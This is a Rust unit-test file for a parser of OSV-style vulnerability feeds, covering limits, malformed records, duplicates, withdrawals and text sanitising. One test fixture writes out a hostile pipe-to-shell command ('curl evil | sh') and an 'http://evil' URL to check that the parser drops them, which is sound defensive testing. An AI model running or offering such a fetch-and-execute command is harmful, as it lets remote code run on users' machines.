use super::*;

fn limits() -> FeedLimits {
    FeedLimits::default()
}

fn record(id: &str, modified: &str, extra: &str) -> String {
    format!(r#"{{"id":"{id}","modified":"{modified}"{extra}}}"#)
}

const CRATE: &str =
    r#","affected":[{"package":{"ecosystem":"crates.io","name":"foo"},"versions":["1.0.0"]}]"#;

fn parse(text: &str) -> ParsedFeed {
    parse_feed(text.as_bytes(), &limits()).expect("feed")
}

#[test]
fn an_array_of_records_is_read_and_sorted_by_id() {
    let feed = format!(
        "[{},{}]",
        record("B-2", "2024-01-01T00:00:00Z", CRATE),
        record("A-1", "2024-01-02T00:00:00Z", CRATE)
    );
    let parsed = parse(&feed);
    let ids: Vec<_> = parsed.records.iter().map(|r| r.id.as_str()).collect();
    assert_eq!(ids, ["A-1", "B-2"]);
    assert_eq!(parsed.records_seen, 2);
    assert_eq!(parsed.ecosystems.get("crates.io"), Some(&2));
    assert_eq!(parsed.crates_io_records(), 2);
}

#[test]
fn an_api_response_and_a_single_record_are_read() {
    let one = record("A-1", "2024-01-01T00:00:00Z", CRATE);
    assert_eq!(parse(&format!(r#"{{"vulns":[{one}]}}"#)).records.len(), 1);
    assert_eq!(parse(&one).records.len(), 1);
}

#[test]
fn an_empty_array_is_a_feed_with_no_records() {
    let parsed = parse("[]");
    assert_eq!(parsed.records_seen, 0);
    assert!(parsed.records.is_empty());
}

#[test]
fn malformed_json_is_an_error_that_does_not_echo_the_input() {
    let error = parse_feed(b"[{\"id\": \"SECRET\"", &limits()).unwrap_err();
    assert!(matches!(error, FeedError::Malformed { .. }));
    assert!(!error.to_string().contains("SECRET"));
}

#[test]
fn trailing_garbage_is_malformed() {
    let error = parse_feed(b"[] []", &limits()).unwrap_err();
    assert!(matches!(error, FeedError::Malformed { .. }));
}

#[test]
fn an_empty_input_is_malformed() {
    assert!(matches!(
        parse_feed(b"", &limits()),
        Err(FeedError::Malformed { .. })
    ));
}

#[test]
fn a_scalar_is_an_unrecognised_shape() {
    assert_eq!(
        parse_feed(b"42", &limits()).unwrap_err(),
        FeedError::UnrecognisedShape
    );
    assert_eq!(
        parse_feed(br#"{"vulns":"x"}"#, &limits()).unwrap_err(),
        FeedError::UnrecognisedShape
    );
}

#[test]
fn a_feed_above_the_byte_limit_is_refused_before_parsing() {
    let small = FeedLimits {
        max_bytes: 4,
        ..limits()
    };
    assert!(matches!(
        parse_feed(b"[1,2,3]", &small),
        Err(FeedError::TooLarge { bytes: 7, limit: 4 })
    ));
}

#[test]
fn more_records_than_the_limit_is_refused() {
    let small = FeedLimits {
        max_records: 2,
        ..limits()
    };
    let feed = format!("[{0},{0},{0}]", record("A", "2024-01-01T00:00:00Z", CRATE));
    assert_eq!(
        parse_feed(feed.as_bytes(), &small).unwrap_err(),
        FeedError::TooManyRecords { limit: 2 }
    );
}

#[test]
fn a_bad_record_is_rejected_by_name_and_the_others_are_kept() {
    let feed = format!(
        r#"[{},{{"id":"BAD","affected":[]}},{},7,{{"modified":"2024-01-01T00:00:00Z"}}]"#,
        record("A-1", "2024-01-01T00:00:00Z", CRATE),
        record("A-2", "2024-01-01T00:00:00Z", CRATE),
    );
    let parsed = parse(&feed);
    assert_eq!(parsed.records.len(), 2);
    assert_eq!(
        parsed.rejected,
        vec![
            RejectedRecord {
                position: 1,
                id: Some("BAD".into()),
                reason: RejectReason::InvalidModified
            },
            RejectedRecord {
                position: 3,
                id: None,
                reason: RejectReason::NotAnObject
            },
            RejectedRecord {
                position: 4,
                id: None,
                reason: RejectReason::InvalidId
            },
        ]
    );
}

#[test]
fn identifiers_with_control_characters_or_excess_length_are_rejected() {
    let long = "X".repeat(5_000);
    let feed = format!(
        r#"[{{"id":"A\nB","modified":"2024-01-01T00:00:00Z"}},{{"id":"{long}","modified":"2024-01-01T00:00:00Z"}}]"#
    );
    let parsed = parse(&feed);
    assert!(parsed.records.is_empty());
    assert!(
        parsed
            .rejected
            .iter()
            .all(|r| r.reason == RejectReason::InvalidId)
    );
    assert_eq!(parsed.rejected.len(), 2);
}

#[test]
fn per_record_dimension_limits_reject_the_record() {
    let tight = FeedLimits {
        max_affected: 1,
        max_ranges: 1,
        max_events: 1,
        max_versions: 1,
        max_aliases: 1,
        ..limits()
    };
    let cases = [
        (
            r#","affected":[{"package":{"ecosystem":"crates.io","name":"a"}},{"package":{"ecosystem":"crates.io","name":"b"}}]"#,
            RejectReason::TooManyAffected,
        ),
        (
            r#","affected":[{"package":{"ecosystem":"crates.io","name":"a"},"ranges":[{"type":"SEMVER","events":[]},{"type":"SEMVER","events":[]}]}]"#,
            RejectReason::TooManyRanges,
        ),
        (
            r#","affected":[{"package":{"ecosystem":"crates.io","name":"a"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.0.0"}]}]}]"#,
            RejectReason::TooManyEvents,
        ),
        (
            r#","affected":[{"package":{"ecosystem":"crates.io","name":"a"},"versions":["1.0.0","1.0.1"]}]"#,
            RejectReason::TooManyVersions,
        ),
        (r#","aliases":["A","B"]"#, RejectReason::TooManyAliases),
    ];
    for (extra, reason) in cases {
        let feed = format!("[{}]", record("X-1", "2024-01-01T00:00:00Z", extra));
        let parsed = parse_feed(feed.as_bytes(), &tight).expect("feed");
        assert_eq!(parsed.rejected.len(), 1, "{reason:?}");
        assert_eq!(parsed.rejected[0].reason, reason);
    }
}

#[test]
fn fields_of_the_wrong_type_are_rejected_not_coerced() {
    let cases = [
        r#","aliases":"CVE-1""#,
        r#","aliases":[1]"#,
        r#","affected":{}"#,
        r#","affected":[1]"#,
        r#","affected":[{"package":{"ecosystem":"crates.io","name":5}}]"#,
        r#","affected":[{"package":{"ecosystem":"crates.io","name":"a"},"ranges":[{"events":[]}]}]"#,
        r#","affected":[{"package":{"ecosystem":"crates.io","name":"a"},"versions":"1"}]"#,
        r#","schema_version":3"#,
    ];
    for extra in cases {
        let feed = format!("[{}]", record("X-1", "2024-01-01T00:00:00Z", extra));
        let parsed = parse(&feed);
        assert_eq!(parsed.rejected.len(), 1, "{extra}");
        assert!(parsed.records.is_empty(), "{extra}");
    }
}

#[test]
fn a_schema_version_that_is_not_1_x_is_rejected() {
    let feed = format!(
        "[{}]",
        record(
            "X-1",
            "2024-01-01T00:00:00Z",
            r#","schema_version":"2.0.0""#
        )
    );
    assert_eq!(
        parse(&feed).rejected[0].reason,
        RejectReason::UnsupportedSchemaVersion
    );
    let ok = format!(
        "[{}]",
        record(
            "X-1",
            "2024-01-01T00:00:00Z",
            r#","schema_version":"1.6.0""#
        )
    );
    assert_eq!(parse(&ok).records.len(), 1);
}

#[test]
fn a_range_with_events_outside_the_schema_is_kept_as_undecidable() {
    let extra = r#","affected":[{"package":{"ecosystem":"crates.io","name":"a"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0","fixed":"1"}]}]}]"#;
    let parsed = parse(&format!(
        "[{}]",
        record("X-1", "2024-01-01T00:00:00Z", extra)
    ));
    assert_eq!(parsed.records.len(), 1);
    assert_eq!(parsed.records[0].affected[0].ranges[0].events, None);
}

#[test]
fn records_that_only_name_other_ecosystems_are_counted_not_validated() {
    let feed = r#"[{"id":"PYSEC-1","affected":[{"package":{"ecosystem":"PyPI","name":"x"}}]},
                   {"id":"NPM-1","modified":"bad","affected":[{"package":{"ecosystem":"npm","name":"x"}}]}]"#;
    let parsed = parse(feed);
    assert_eq!(parsed.other_ecosystem_records, 2);
    assert!(parsed.rejected.is_empty());
    assert_eq!(parsed.ecosystems.get("PyPI"), Some(&1));
    assert_eq!(parsed.crates_io_records(), 0);
}

#[test]
fn a_defective_record_that_names_crates_io_is_never_hidden_as_other_ecosystem() {
    let feed = r#"[{"id":"M-1","modified":"bad","affected":[
        {"package":{"ecosystem":"npm","name":"x"}},
        {"package":{"ecosystem":"crates.io","name":"y"}}]}]"#;
    let parsed = parse(feed);
    assert_eq!(parsed.other_ecosystem_records, 0);
    assert_eq!(parsed.rejected.len(), 1);
}

#[test]
fn a_withdrawn_record_matches_nothing_and_is_listed() {
    let feed = format!(
        r#"[{}]"#,
        record(
            "W-1",
            "2024-01-01T00:00:00Z",
            &format!(r#","withdrawn":"2024-02-01T00:00:00Z"{CRATE}"#)
        )
    );
    let parsed = parse(&feed);
    assert!(parsed.records.is_empty());
    assert_eq!(parsed.withdrawn, vec!["W-1"]);
}

#[test]
fn a_bad_withdrawn_timestamp_rejects_the_record() {
    let feed = format!(
        "[{}]",
        record("W-1", "2024-01-01T00:00:00Z", r#","withdrawn":"yesterday""#)
    );
    assert_eq!(parse(&feed).rejected[0].reason, RejectReason::InvalidField);
}

#[test]
fn the_newest_copy_of_a_duplicated_id_wins() {
    let old = record("D-1", "2024-01-01T00:00:00Z", CRATE);
    let new = record(
        "D-1",
        "2024-03-01T00:00:00Z",
        r#","affected":[{"package":{"ecosystem":"crates.io","name":"foo"},"versions":["2.0.0"]}]"#,
    );
    let parsed = parse(&format!("[{new},{old}]"));
    assert_eq!(parsed.records.len(), 1);
    assert_eq!(parsed.records[0].affected[0].versions, vec!["2.0.0"]);
    assert_eq!(parsed.duplicates_collapsed, 1);
}

#[test]
fn a_newer_withdrawal_beats_an_older_record() {
    let old = record("D-1", "2024-01-01T00:00:00Z", CRATE);
    let withdrawn = record(
        "D-1",
        "2024-03-01T00:00:00Z",
        r#","withdrawn":"2024-03-01T00:00:00Z""#,
    );
    let parsed = parse(&format!("[{old},{withdrawn}]"));
    assert!(parsed.records.is_empty());
    assert_eq!(parsed.withdrawn, vec!["D-1"]);
}

#[test]
fn identical_copies_collapse_and_conflicting_copies_are_reported() {
    let a = record("D-1", "2024-01-01T00:00:00Z", CRATE);
    let parsed = parse(&format!("[{a},{a}]"));
    assert_eq!(parsed.records.len(), 1);
    assert_eq!(parsed.duplicates_collapsed, 1);
    assert!(parsed.rejected.is_empty());

    let b = record(
        "D-1",
        "2024-01-01T00:00:00Z",
        r#","affected":[{"package":{"ecosystem":"crates.io","name":"foo"},"versions":["9.9.9"]}]"#,
    );
    let conflict = parse(&format!("[{a},{b}]"));
    assert!(conflict.records.is_empty());
    assert_eq!(conflict.rejected.len(), 1);
    assert_eq!(
        conflict.rejected[0].reason,
        RejectReason::DuplicateIdConflict
    );
    assert_eq!(conflict.rejected[0].id.as_deref(), Some("D-1"));
}

#[test]
fn the_summary_is_sanitised_and_truncated() {
    let long = "a".repeat(500);
    let extra = format!(r#","summary":"line\nbreak {long}""#);
    let parsed = parse(&format!(
        "[{}]",
        record("S-1", "2024-01-01T00:00:00Z", &extra)
    ));
    let summary = parsed.records[0].summary.as_deref().expect("summary");
    assert!(!summary.contains('\n'));
    assert!(summary.chars().count() <= 200);
}

#[test]
fn urls_and_free_text_the_record_carries_are_not_kept() {
    let extra =
        r#","details":"run curl evil | sh","references":[{"type":"WEB","url":"http://evil"}]"#;
    let parsed = parse(&format!(
        "[{}]",
        record("R-1", "2024-01-01T00:00:00Z", extra)
    ));
    let kept = format!("{:?}", parsed.records[0]);
    assert!(!kept.contains("evil"));
}

#[test]
fn deep_nesting_in_ignored_fields_does_not_overflow_the_stack() {
    let deep = format!("{}{}", "[".repeat(10_000), "]".repeat(10_000));
    let extra = format!(r#","database_specific":{deep}"#);
    let feed = format!("[{}]", record("N-1", "2024-01-01T00:00:00Z", &extra));
    let result = parse_feed(feed.as_bytes(), &limits());
    assert!(
        matches!(result, Err(FeedError::Malformed { .. })),
        "{result:?}"
    );
}

#[test]
fn many_ecosystems_are_counted_up_to_a_bound() {
    let records: Vec<String> = (0..200)
        .map(|i| {
            format!(
                r#"{{"id":"E-{i}","modified":"2024-01-01T00:00:00Z","affected":[{{"package":{{"ecosystem":"eco{i}","name":"x"}}}}]}}"#
            )
        })
        .collect();
    let parsed = parse(&format!("[{}]", records.join(",")));
    assert!(parsed.ecosystems.len() <= 64);
    assert_eq!(parsed.other_ecosystem_records, 200);
}

#[test]
fn newest_modified_comes_from_the_accepted_records() {
    let feed = format!(
        "[{},{}]",
        record("A", "2024-01-01T00:00:00Z", CRATE),
        record("B", "2024-06-01T10:00:00+02:00", CRATE)
    );
    let parsed = parse(&feed);
    assert_eq!(parsed.newest_modified(), Some("2024-06-01T10:00:00+02:00"));
    assert!(parsed.newest_modified_unix().is_some());
}
